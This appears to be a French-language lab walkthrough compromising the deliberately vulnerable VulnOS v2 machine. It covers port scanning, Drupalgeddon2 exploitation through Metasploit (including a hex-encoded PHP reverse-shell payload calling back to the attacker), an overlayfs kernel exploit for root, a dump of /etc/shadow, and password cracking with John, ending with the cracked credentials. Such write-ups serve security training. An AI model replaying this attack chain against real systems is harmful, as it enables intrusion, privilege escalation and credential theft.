1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.59
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.59...100%
[+] Scan Nmap 192.168.56.59...100%

[+] 22/tcp open
[+] 80/tcp open

==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.59-tcp.html        |
==========================================================
```

&nbsp;

2.Exploitation

**<span style="color: #dddddd;">💥</span> Metasploit**

```
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set targeturi /jabc
targeturi => /jabc
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set rhosts 192.168.56.59
rhosts => 192.168.56.59
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set lhost 192.168.56.104
lhost => 192.168.56.104
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Drupal 7 targeted at http://192.168.56.59/jabc/
[-] Could not determine Drupal patch level
[!] The service is running, but could not be validated.
[*] Executing with assert(): eval(hex2bin("2f2a3c3f706870202f2a2a2f206572726f725f7265706f7274696e672830293b20246970203d20273139322e3136382e35362e313034273b2024706f7274203d20343434343b2069662028282466203d202773747265616d5f736f636b65745f636c69656e7427292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202773747265616d273b207d206966202821247320262620282466203d202766736f636b6f70656e27292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202773747265616d273b207d206966202821247320262620282466203d2027736f636b65745f63726561746527292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2027736f636b6574273b207d20696620282124735f7479706529207b2064696528276e6f20736f636b65742066756e637327293b207d206966202821247329207b2064696528276e6f20736f636b657427293b207d20737769746368202824735f7479706529207b2063617365202773747265616d273a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652027736f636b6574273a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b276c656e275d3b202462203d2027273b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202773747265616d273a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652027736f636b6574273a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b276d7367736f636b275d203d2024733b2024474c4f42414c535b276d7367736f636b5f74797065275d203d2024735f747970653b2069662028657874656e73696f6e5f6c6f6164656428277375686f73696e272920262620696e695f67657428277375686f73696e2e6578656375746f722e64697361626c655f6576616c272929207b20247375686f73696e5f6279706173733d6372656174655f66756e6374696f6e2827272c202462293b20247375686f73696e5f62797061737328293b207d20656c7365207b206576616c282462293b207d2064696528293b"));
[*] Executing with passthru(): php -r 'eval(hex2bin("2f2a3c3f706870202f2a2a2f206572726f725f7265706f7274696e672830293b20246970203d20273139322e3136382e35362e313034273b2024706f7274203d20343434343b2069662028282466203d202773747265616d5f736f636b65745f636c69656e7427292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202773747265616d273b207d206966202821247320262620282466203d202766736f636b6f70656e27292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202773747265616d273b207d206966202821247320262620282466203d2027736f636b65745f63726561746527292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2027736f636b6574273b207d20696620282124735f7479706529207b2064696528276e6f20736f636b65742066756e637327293b207d206966202821247329207b2064696528276e6f20736f636b657427293b207d20737769746368202824735f7479706529207b2063617365202773747265616d273a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652027736f636b6574273a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b276c656e275d3b202462203d2027273b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202773747265616d273a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652027736f636b6574273a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b276d7367736f636b275d203d2024733b2024474c4f42414c535b276d7367736f636b5f74797065275d203d2024735f747970653b2069662028657874656e73696f6e5f6c6f6164656428277375686f73696e272920262620696e695f67657428277375686f73696e2e6578656375746f722e64697361626c655f6576616c272929207b20247375686f73696e5f6279706173733d6372656174655f66756e6374696f6e2827272c202462293b20247375686f73696e5f62797061737328293b207d20656c7365207b206576616c282462293b207d2064696528293b"));'
[*] Sending stage (40004 bytes) to 192.168.56.59
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.59:58127) at 2025-01-21 21:39:49 +0100

(Meterpreter 1)(/var/www/html/jabc) > 

```

&nbsp;

**🤖 Linpeas**

```
(Meterpreter 1)(/var/www/html/jabc) > cd /tmp
(Meterpreter 1)(/tmp) > upload /usr/share/peass/linpeas/linpeas.sh
[*] Uploading  : /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 828.43 KiB (0.0%): /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
[*] Completed  : /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
```

&nbsp;

Ajout des droit d’éxécution

```
(Meterpreter 1)(/tmp) > shell
Process 2637 created.
Channel 1 created.
bash -i
www-data@VulnOSv2:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@VulnOSv2:/tmp$
```

&nbsp;

Exploit potentiel d’élévation de privilège

```
www-data@VulnOSv2:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

```

&nbsp;

**<span style="color: #dddddd;">💀</span> Exploit Overlays**

Upload de l’exploit `Overlays`

```
(Meterpreter 1)(/tmp) > upload overlays.c
[*] Uploading  : /home/parrot/overlays.c -> overlays.c
[*] Uploaded -1.00 B of 5.00 KiB (-0.02%): /home/parrot/overlays.c -> overlays.c
[*] Completed  : /home/parrot/overlays.c -> overlays.c
```

&nbsp;

Compilation

```
(Meterpreter 1)(/tmp) > shell
Process 25166 created.
Channel 43 created.
bash -i
bash: cannot set terminal process group (1308): Inappropriate ioctl for device
bash: no job control in this shell
www-data@VulnOSv2:/tmp$ gcc overlays.c
www-data@VulnOSv2:/tmp$ ls
ls
a.out
overlays.c
linpeas.sh
ofs-lib.so

```

&nbsp;

Exécution

```
www-data@VulnOSv2:/tmp$ ./a.out
./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# bash -i
root@VulnOSv2:/tmp# 
```

&nbsp;

Dump des `hash` utilisateur

```
root@VulnOSv2:/tmp# cat /etc/shadow
root:$6$FUG2g0oZ$KSa0C5cB4IZKYUxSAlTHW3XpUXLNaZZOcMzw5Vj0t3JEVZ9rHMPmsWUkWSxV.c4FnOEt.BCW/e7GWQZyNLbXD.:16923:0:99999:7:::
daemon:*:16176:0:99999:7:::
bin:*:16176:0:99999:7:::
sys:*:16176:0:99999:7:::
sync:*:16176:0:99999:7:::
games:*:16176:0:99999:7:::
man:*:16176:0:99999:7:::
lp:*:16176:0:99999:7:::
mail:*:16176:0:99999:7:::
news:*:16176:0:99999:7:::
uucp:*:16176:0:99999:7:::
proxy:*:16176:0:99999:7:::
www-data:*:16176:0:99999:7:::
backup:*:16176:0:99999:7:::
list:*:16176:0:99999:7:::
irc:*:16176:0:99999:7:::
gnats:*:16176:0:99999:7:::
nobody:*:16176:0:99999:7:::
libuuid:!:16176:0:99999:7:::
syslog:*:16176:0:99999:7:::
messagebus:*:16894:0:99999:7:::
landscape:*:16894:0:99999:7:::
vulnosadmin:$6$.Bf3m/IA$6Rdtk2OqLl/0zfUtYolmbYQNHObJm03Ppv3fdDeNC2kZsITpGbVH8nDy3x36tqaKxvM5DhKM50ZohosUJyECC1:16911:0:99999:7:::
mysql:!:16894:0:99999:7:::
webmin:$6$sGKv.ZGm$o1JZ/ECW3/rMZZEUTLD6XaxCUzYJ0d6KJf8Axgk2H3szlMMQom.cNvrJJhkgqbKOD1vxXlhCz9sQA2sY1LN781:16907:0:99999:7:::
sshd:*:16907:0:99999:7:::
postfix:*:16907:0:99999:7:::
postgres:*:16916:0:99999:7:::
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john vulnos2 --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 3 password hashes with 3 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
c4nuh4ckm3tw1c3  (vulnosadmin)     
ab12fg//drg      (root)
webmin1980       (webmin)
2g 0:00:00:00 DONE (2025-01-21 22:30) 2.439g/s 624.3p/s 1248c/s 1248C/s c4nuh4ckm3tw1c3..garcia
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john --show vulnos2 
vulnosadmin:c4nuh4ckm3tw1c3:16911:0:99999:7:::
webmin:webmin1980:16907:0:99999:7:::
root:ab12fg//drg:16923:0:99999:7:::

3 password hashes cracked, 0 left
```

&nbsp;

Cred trouver

| Users | Password |
| --- | --- |
| vulnosadmin | c4nuh4ckm3tw1c3 |
| webmin | webmin1980 |
| root | ab12fg//drg |
